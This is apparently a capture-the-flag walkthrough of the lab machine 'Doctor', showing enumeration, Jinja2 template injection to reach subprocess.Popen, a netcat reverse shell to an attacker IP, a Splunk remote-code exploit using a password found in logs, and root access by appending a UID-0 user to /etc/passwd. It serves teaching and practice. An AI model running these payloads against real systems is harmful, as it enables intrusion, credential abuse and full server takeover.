# Doctor

### Basic Information
**Machine name:** Doctor  
**IP:** 10.10.10.209  
**Written by:** Adir Biran  
**Tools:** Nmap, Gobuster    
**Method:** Enumerating the various services, exploiting SSTI vulnerability to get access on the machine.  
Escalting privileges once with group misconfiguration and leaked password on log files and second time with splunk exploit.  


## Enumeration


#### Nmap
<p align="center">
<img width="386" alt="1" src="https://user-images.githubusercontent.com/21021400/145070363-e36e0a87-2d84-470a-b568-ee3e714e79ae.png">
</p>

Open Ports:  
22 - SSH  
80 - HTTP  
8089 - HTTPS  

#### Gobuster

Gobuster - Port 80  
<p align="center">
<img width="333" alt="2" src="https://user-images.githubusercontent.com/21021400/145070368-02732367-abd5-490f-9afa-cbb693b24221.png">
</p>

Gobuster - Port 8089  
<p align="center">
<img width="340" alt="3" src="https://user-images.githubusercontent.com/21021400/145070370-dbff4a9a-4424-477b-b0f5-214a65eb9f96.png">
</p>

The website - Port 80  
<p align="center">
<img width="960" alt="4" src="https://user-images.githubusercontent.com/21021400/145070374-1efe38f4-b524-4db2-a2c0-477bc42c5354.png">
</p>

Found a mail address info@doctors.htb  

Added doctors.htb to hosts file  
<p align="center">
<img width="114" alt="5" src="https://user-images.githubusercontent.com/21021400/145070379-9a2f8959-a692-417a-87e0-3f431c6ace05.png">
</p>

Gobuster - doctors.htb  
<p align="center">
<img width="379" alt="6" src="https://user-images.githubusercontent.com/21021400/145070380-c9e21e89-5d7a-4ddc-8973-e5100a97833b.png">
</p>

The website - Port 8089  
<p align="center">
<img width="960" alt="7" src="https://user-images.githubusercontent.com/21021400/145070381-e6f7498f-fd12-4714-b8be-a9c87a96b61d.png">
</p>

The service installed is splunk 8.0.5 and requires username and password which we don't have.  
At this point searched for exploits and default credentials, but nothing worked.  

/robots.txt  
<p align="center">
<img width="294" alt="7-1" src="https://user-images.githubusercontent.com/21021400/145070385-a5d06a75-3c53-4fcc-becd-2ab7c4c9e45e.png">
</p>

Nothing useful found so far.  
We will get back to splunk later when we find the credentials.  

doctors.htb leads to a login page  
<p align="center">
<img width="960" alt="8" src="https://user-images.githubusercontent.com/21021400/145070386-e2e5c368-428f-49d5-a25d-a3b932f8a7bb.png">
</p>

/archive leads to a blank page, but viewing the source code:  
<p align="center">
<img width="297" alt="8-2" src="https://user-images.githubusercontent.com/21021400/145070389-47a71f76-3463-43f2-b375-a54940d9d70f.png">
</p>

Tried SQL injection but all trials failed.  

Registered a new account  
<p align="center">
<img width="960" alt="9" src="https://user-images.githubusercontent.com/21021400/145070391-aeed7b43-c08d-405c-b47a-b79c124936be.png">
</p>

The account stays active for 20 minutes, after that we will have to create another one.  
<p align="center">
<img width="960" alt="10" src="https://user-images.githubusercontent.com/21021400/145070393-3831d97f-11ac-4f09-b28c-b607adfd5af5.png">
</p>

Tried posting a new message and test for XSS and SSTI:  
<p align="center">
<img width="960" alt="11" src="https://user-images.githubusercontent.com/21021400/145070396-9849cdab-91d2-4686-a121-4269e3d18b69.png">
</p>

However, looks like the code isn't injected.  

Kept trying different syntaxes based on PayloadAllTheThings repository:  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection  

After enumerating and looking back at /archive, even though the page is blank, when looking again at the source code, we can see the website is vulnerable to SSTI attack as the input (7+7) was rendered by the template engine.  
<p align="center">
<img width="317" alt="12" src="https://user-images.githubusercontent.com/21021400/145070399-473708ab-1a3c-44aa-803e-c2cb47dfe3e4.png">
</p>

Found this article about SSTI on Jinja2/Flask.  
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee  

There are multiple methods found to achieve the RCE easily, but we will do it manually.  
Started climbing the tree, by entering the following commands into the template, and reading the results from /archive.  

```
{{"".__class__}}  
```

<p align="center">
<img width="780" alt="13" src="https://user-images.githubusercontent.com/21021400/145070401-a0ef6be0-ff4b-4e43-8e77-a6b49f9d7b27.png">
</p>

```
{{"".__class__.__mro__}}  
```

<p align="center">
<img width="850" alt="14" src="https://user-images.githubusercontent.com/21021400/145070403-18429496-2db8-4a4b-b963-1d4db3cb64bf.png">
</p>

```
{{"".__class__.__mro__[1]}}  
```

<p align="center">
<img width="792" alt="15" src="https://user-images.githubusercontent.com/21021400/145070404-c5cf216b-3009-4b20-b6ab-899dca191b72.png">
</p>

```
{{"".__class__.__mro__[1].__subclasses__()}}  
```

<p align="center">
<img width="960" alt="16" src="https://user-images.githubusercontent.com/21021400/145070408-0ce406cc-1e4b-4a44-8993-84e99a95fb37.png">
</p>

The input we received from this stage, contains all the modules that are imported.  
In order to execute code on the machine, we need to locate the correct module and function.  

First, we'll copy the whole line to a file and remove the begining and tailing tags (<title>,<item>).  
<p align="center">
<img width="960" alt="17" src="https://user-images.githubusercontent.com/21021400/145070409-fd928bdf-8320-454f-8bc5-e258dff6f5ac.png">
</p>

As we can see its a long list with HTML entities:  
\&lt; represents "lower than" <  
*gt; represents "greater than" >  
\&#39; represents '  

We will use sed to find and replaces all occurences of the HTML entities.

replace all \&lt; occurrences with <  
```
sed 's/&lt;/</g'  
```
                                        
replace all \&gt; occurrences with >  
```
sed 's/&gt;/>/g'  
```
 
replace all \&#39; occurences with '  
```
sed "s/&#39;/'/g"  
```
 
replace all commas with new lines  
```
sed "s/, /\n/g"  
```
 
Combining the 4 together:  
  
```
cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g"  
```
  
 <p align="center">
<img width="373" alt="18" src="https://user-images.githubusercontent.com/21021400/145070411-cf71df60-3479-4c38-98ed-bc62497531ab.png">
</p>

Now that we have a beautiful list, let's look for subprocess module.  
  
```
cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess  
```
  
<p align="center">
<img width="444" alt="19" src="https://user-images.githubusercontent.com/21021400/145070413-39804b1c-aa60-4afd-af55-19d26aed70cd.png">
</p>

Now let's get the line number of subprocess.Popen using grep with -n tag.
  
```
cat results | sed 's/&gt;/>/g' | sed 's/&lt;/</g' | sed "s/&#39;/'/g" | sed "s/, /\n/g" | grep subprocess -n  
```
  
<p align="center">
<img width="481" alt="20" src="https://user-images.githubusercontent.com/21021400/145070414-696d4f87-a62b-44c7-bf44-8424cf60f390.png">
</p>

subprocess.Popen is at line 408.  
However we need to substract 1 from the line number we got because the indexes do not align.  

So the next command to inject into the template engine will be:  
  
```
{{"".__class__.__mro__[1].__subclasses__()[407]}}  
```
  
<p align="center">
<img width="809" alt="21" src="https://user-images.githubusercontent.com/21021400/145070415-ea694684-f824-4a87-be4b-d3cdce1c281c.png">
</p>

We will try to execute 'whoami' as a POC:  
  
 ```
{{"".__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}  
 ```
  
<p align="center">
<img width="765" alt="22" src="https://user-images.githubusercontent.com/21021400/145070416-2fa1c596-9ebf-4873-81aa-ca7db1deb2be.png">
</p>

We can see that it runs as "web".  

To get a reverse shell, we'll just replace the command with the reverse shell code.  
Tried a few syntaxes of nc reverse shell payloads but only this on worked:  
```
rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f  
```
  
Opened netcat on port 1234 and injected the following command:  
  
 ```
{{"".__class__.__mro__[1].__subclasses__()[407]('rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 1234 >/tmp/f', shell=True, stdout=-1).communicate()}}  
 ```
<p align="center">
<img width="244" alt="23" src="https://user-images.githubusercontent.com/21021400/145070417-70d1d27f-d427-4f97-8600-61d475f5f10f.png">
</p>

We're in as web.  

Other users on the machine:  
<p align="center">
<img width="263" alt="23-2" src="https://user-images.githubusercontent.com/21021400/145070418-5d076fde-dccd-4d23-b7df-3c370cdd5600.png">
</p>

web user is part of the adm group  
<p align="center">
<img width="206" alt="24" src="https://user-images.githubusercontent.com/21021400/145070420-2a520117-27a7-4a4c-8c2d-068c2b551690.png">
</p>

Meaning, we can read log files that located in /var/log.  
<p align="center">
<img width="358" alt="25" src="https://user-images.githubusercontent.com/21021400/145070422-fea9a608-f9a4-4856-8f38-717bec6b3d08.png">
</p>

After checking several log files, got a hit on a backup file located in /var/log/apache2:    
<p align="center">
<img width="506" alt="26" src="https://user-images.githubusercontent.com/21021400/145070424-b4038db3-f93b-4f69-88a4-9a47684c3f37.png">
</p>

Password found: Guitar123  

Tried login to the other users  
<p align="center">
<img width="157" alt="27" src="https://user-images.githubusercontent.com/21021400/145070426-ae0e0271-8010-46a8-a93d-e95568315b54.png">
</p>

splunk failed but shaun succeed with Guitar123 as the password.  

After checking several methods to escalate to root (that failed), decided to try those credentials on the website on port 8089 from earlier.  
<p align="center">
<img width="394" alt="28" src="https://user-images.githubusercontent.com/21021400/145070429-2262b2d4-229a-47ff-82d8-26d396c41aee.png">
</p>

It worked.  

Searched on google what can be exploited with splunk credentials.  
Found this repository and gave it a shot: https://github.com/cnotin/SplunkWhisperer2.git  

Cloned the repository  
<p align="center">
<img width="260" alt="29" src="https://user-images.githubusercontent.com/21021400/145070434-7f118fbf-9601-4236-a037-118ec7714f66.png">
</p>

Running the exploit indicates the parameters needed:  
<p align="center">
<img width="640" alt="30" src="https://user-images.githubusercontent.com/21021400/145070437-7f4cdf1f-c3f0-43ba-a6a5-7534814272ea.png">
</p>

So the POC command will be:  
```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'whoami'  
 ```
<p align="center">
<img width="549" alt="31" src="https://user-images.githubusercontent.com/21021400/145070440-23ae5d98-2c92-45ab-b420-7331090f7ecc.png">
</p>

However, we don't get results from the exploit even though it seems to work.  
Let's try another way to get POC that the exploit works, by creating a file on the remote machine on /tmp directory:  
 ```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'touch /tmp/test'  
 ```
<p align="center">
<img width="588" alt="32" src="https://user-images.githubusercontent.com/21021400/145070443-92433f3e-4814-42bc-a7a6-ae668156b2c0.png">
</p>

And on the remote machine while on shaun user, check the /tmp directory:  
<p align="center">
<img width="503" alt="33" src="https://user-images.githubusercontent.com/21021400/145070445-f3bba0c8-94f8-43fc-bf9d-22649a5e9421.png">
</p>

We can see that the file was created by root.  
 
We will escalate the privileges by adding an entry to the /etc/passwd file.  
On the local machine, create a password for the new user to be added:  
 ```
perl -le 'print crypt("pass", "anything")'  
 ```
<p align="center">
<img width="184" alt="34" src="https://user-images.githubusercontent.com/21021400/145070446-bb62b007-e364-4e78-98d4-c32c20ece2e3.png">
</p>

The line that needs to be added to the passwd file is:  
 ```
root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash  
 ```

So the final command is:  
 ```
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.6 --username shaun --password Guitar123 --payload 'echo "root2:an5CaYOk82Zq6:0:0:root2:/root:/bin/bash" >> /etc/passwd'  
 ```
<p align="center">
<img width="472" alt="35" src="https://user-images.githubusercontent.com/21021400/145070448-eebf4bef-cf8c-4bd8-8ba2-4b72537f158b.png">
</p>

Checking on the victim's machine that the entry was added successfuly  
<p align="center">
<img width="399" alt="36" src="https://user-images.githubusercontent.com/21021400/145070451-1d238fd8-8f31-4151-8032-41f5cfb5fbff.png">
</p>

Switching to root2 with "pass" as password that created previously.  
<p align="center">
<img width="159" alt="37" src="https://user-images.githubusercontent.com/21021400/145070452-26de30da-9b7d-4e93-832d-4cc65971a696.png">
</p>

and we're root.  
